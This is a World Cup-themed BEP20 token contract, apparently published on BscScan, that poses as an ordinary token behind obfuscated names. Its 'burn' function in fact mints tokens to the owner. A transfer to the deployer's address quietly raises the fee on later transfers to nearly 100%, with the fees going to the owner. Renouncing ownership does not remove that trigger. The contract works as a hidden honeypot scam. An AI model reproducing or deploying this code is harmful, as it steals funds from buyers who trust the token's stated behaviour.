/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20 10:05 GMT
 */

////////////////////////////////////////////////////////////////////////

//Hayya Hayya (Better Together) | FIFA World Cup 
//
//Qatar 2022™ Official Soundtrack
//https://youtu.be/vyDjFVZgJoo
//https://twitter.com/auron83591234
//https://www.instagram.com/fifaworldcup            
//https://www.facebook.com/fifawomenswo
////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract NCKSUXG {
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "Hayya";
uint256 private  DXVTQB = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint8 public constant decimals = 18;
address private  UEDWDP = address(0);
uint256 private  HXSGUE = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  IEMZMR = address(0);
uint256 public constant ZBWVCJ = 99999;
uint256 private  AGGGXL = 1000000000000000;
uint256 private  KGZIIE = 1000000000000000000;
uint256 private  QZOGOU = 1000000000000000000000;
address private  HTVTJK = address(0);
uint256 private  DBXCTA = 10000000000000;
string public  symbol = "Hayya";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  BVRLBL = address(0);
address public owner;
address private  HBKKQN = address(0);
uint256 private  YNDKZQ = 10000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getBVRLBL() private returns (address) {
return BVRLBL;
}

function _getDBXCTA() private returns (uint256) {
return DBXCTA;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getUEDWDP() private returns (address) {
return UEDWDP;
}

function _getAGGGXL() private returns (uint256) {
return AGGGXL;
}

function _getDXVTQB() private returns (uint256) {
return DXVTQB;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AJVDOX");
require(to != address(0), "AJVDOX");
require(amount <= balanceOf[from], "AJVDOX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ZBWVCJ/HXSGUE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HTVTJK){
HXSGUE = ZBWVCJ+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
HTVTJK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getHBKKQN() private returns (address) {
return HBKKQN;
}

function _getYNDKZQ() private returns (uint256) {
return YNDKZQ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tAJVDOX 0");
require(spender != address(0), "fAJVDOX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getKGZIIE() private returns (uint256) {
return KGZIIE;
}

function _getQZOGOU() private returns (uint256) {
return QZOGOU;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getIEMZMR() private returns (address) {
return IEMZMR;
}


}